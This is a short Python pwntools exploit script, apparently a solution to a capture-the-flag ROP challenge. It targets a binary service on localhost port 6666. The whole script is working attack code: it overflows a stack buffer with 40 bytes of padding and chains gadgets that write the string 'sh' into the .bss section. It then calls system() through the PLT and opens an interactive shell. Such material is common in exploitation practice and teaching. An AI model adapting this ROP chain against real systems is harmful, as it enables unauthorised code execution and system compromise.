#!/usr/bin/env python

from pwn import *

p = remote("127.0.0.1", 6666)
p.recvuntil('>')

# Method 1
bss_section = p64(0x601060)
pop_rsi_r15 = p64(0x400891)
mov_lrsi_edi = p64(0x400821)

# Method 2
'''
data_section = p64(0x601050)
pop_r14_r15 = p64(0x400890)
mov_lr14_r15 = p64(0x400820)
'''

pop_rdi = p64(0x00400893)
system_plt = p64(0x004005e0)

buf = "A"*40
buf += pop_rsi_r15
buf += bss_section
buf += "AAAAAAAA" # junk to r15!
buf += pop_rdi
buf += "sh" + "\x00"*6
buf += mov_lrsi_edi
buf += pop_rdi
buf += bss_section
buf += system_plt

p.sendline(buf)
p.interactive()
